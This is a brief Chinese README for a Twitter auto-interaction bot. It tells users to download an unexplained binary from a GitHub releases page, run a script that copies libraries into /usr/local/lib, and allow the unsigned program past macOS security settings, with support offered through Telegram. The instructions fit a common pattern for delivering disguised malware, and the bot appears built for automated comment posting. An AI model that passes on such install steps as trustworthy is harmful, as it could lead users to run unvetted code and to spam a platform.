# Twitter智能互动平台

 🚀 安装方法

 macOS

 1. 下载文件并解压缩

https://github.com/fliykoa9-sketch/public/releases

 2. 文件目录结构

- `ai_relay_bot` - 主程序入口
- `config.json` - 配置文件
- `post_comments.txt` - 配置文件
- `copy_libs.sh` - 安装脚本
- `*lib` - 动态库文件 

3. 配置文件

配置参数（编辑config.json）

只修改这2个地方即可 

1 自己的推特账号
2 从用户管理界面生成的token
```bash
  "my_username": "your_twitter_username_here",

  "web_api_token": "AI服务访问token",
```


4. 启动程序
   在CMD或者console下面的程序所在目录执行
```bash
#WIN
 ./XXXX
#MAC
 ./XXXX
```
5. 如果有提示没有模块，安装三个依赖文件(有些用户默认没有安装SSL依赖包)

```bash
# macOS
在当前软件解压缩后的目录下或者自己放置的具体程序目录下打开console终端,执行文件拷贝，macOS用户会将这3个动态库拷贝到/usr/local/lib文件目录

chmod + copy_libs.sh
./copy_libs.sh

```


 6. ⚙️ 安全说明

如果程序没运行起来先到设置里面，隐私与安全，点击允许运行

![img]([https://private-user-images.githubusercontent.com/229079095/483064991-781e6b0c-7b20-428f-a937-7577f80edde3.jpg](https://private-user-images.githubusercontent.com/229079095/483064991-781e6b0c-7b20-428f-a937-7577f80edde3.jpg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTYzNzIwNzAsIm5iZiI6MTc1NjM3MTc3MCwicGF0aCI6Ii8yMjkwNzkwOTUvNDgzMDY0OTkxLTc4MWU2YjBjLTdiMjAtNDI4Zi1hOTM3LTc1NzdmODBlZGRlMy5qcGc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwODI4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDgyOFQwOTAyNTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mM2JlMDBhMzI3ZWIzNDg3MWZjYTY5ODNlNjg0ZjNjY2YzNzI4ZGM3NzY3YjYyZTU5Y2ZlZjk2ZmNmM2U3ODY0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.lsk52mOqpZYiD8oWsN_bM1k3rBiNbEujwHKHA2SuuRI))

 7. 🔧 系统要求

- Python 3.12
- Google Chrome浏览器
- 网络连接


 8. 📞 支持

如遇问题请检查：
1. Chrome浏览器
2. 网络连接
3. 配置文件
4. 线上TG客户咨询
